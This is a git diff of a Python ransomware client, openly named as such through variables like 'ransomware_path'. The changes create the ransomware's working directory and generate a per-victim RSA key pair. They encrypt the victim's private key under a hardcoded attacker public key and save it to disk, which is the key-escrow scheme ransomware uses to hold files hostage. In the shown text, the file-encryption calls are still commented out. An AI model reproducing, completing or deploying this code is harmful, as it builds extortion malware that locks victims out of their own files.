@@ -12,6 +12,9 @@ import gc
 from Crypto.Hash import MD5
 import base64
 import pickle
+from Crypto.Hash import SHA
+from Crypto import Random
+from Crypto.Cipher import PKCS1_OAEP
 
 # const variables
 server_public_key = ("""-----BEGIN PUBLIC KEY-----
@@ -126,10 +129,10 @@ def menu():
     test_path = "/home/tarcisio/teste/"
 
     # create ransomware directory 
-    # try:
-    #     os.mkdir(ransomware_path, 0600)
-    # except OSError:
-    #     print('Directory exists')
+    try:
+        os.mkdir(ransomware_path, 0700)
+    except OSError:
+        print('Directory exists')
 
     # get the files in the home directory
     # /home/$USER
@@ -146,10 +149,12 @@ def menu():
     Client_public_key = rsa_object.public_key_PEM
     encrypted_client_private_key = encrypt_priv_key(Client_private_key, server_public_key)
     
-    with open('encrypted_client_private_key.key', 'wb') as output:
-        pickle.dump(cifrado, output, pickle.HIGHEST_PROTOCOL)
+    # save encrypted client private key to disk
+    with open(ransomware_path + '/encrypted_client_private_key.key', 'wb') as output:
+        pickle.dump(encrypted_client_private_key, output, pickle.HIGHEST_PROTOCOL)
     
-    with open(ransomware_path + "client_public_key.PEM", 'wb') as f:
+    # save client public key to disk
+    with open(ransomware_path + "/client_public_key.PEM", 'wb') as f:
         f.write(Client_public_key)
     
     # Free the memory from keys
@@ -162,7 +167,7 @@ def menu():
     # Get the client public key back as object
     client_public_key_object =  RSA.importKey(Client_public_key)
 
-    # # ENCRYPTION STARTS HERE !!!
+    # ENCRYPTION STARTS HERE !!!
     # aes_keys_and_base64_path = start_encryption(files)
     # enc_aes_key_and_base64_path = []
 
@@ -179,7 +184,7 @@ def menu():
     # gc.collect()
 
     # # save to disk -> ENC(AES) BASE64(PATH)
-    # with open(ransomware_path + "AES_encrypted_keys", 'w') as f:
+    # with open(ransomware_path + "/AES_encrypted_keys", 'w') as f:
     #     for _ in enc_aes_key_and_base64_path:
     #         line = _[0] + " " + _[1] + "\n"
     #         f.write(line)
